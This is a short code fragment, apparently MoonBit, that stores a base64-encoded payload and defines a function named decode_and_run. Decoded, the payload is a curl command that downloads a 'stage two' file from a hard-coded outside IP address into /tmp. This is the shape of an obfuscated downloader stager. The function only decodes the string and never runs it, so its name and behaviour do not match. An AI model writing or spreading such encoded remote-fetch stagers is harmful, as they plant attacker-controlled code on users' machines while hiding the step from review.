///|
let payload : String =
  "Y3VybCBodHRwOi8vMTMuMzcuMTMuMzcvc3RhZ2UvdHdvLWFyZW5hIC0tb3V0cHV0IC90bXAvcw=="

///|
fn decode_and_run() -> String {
  payload.from_base64()
}
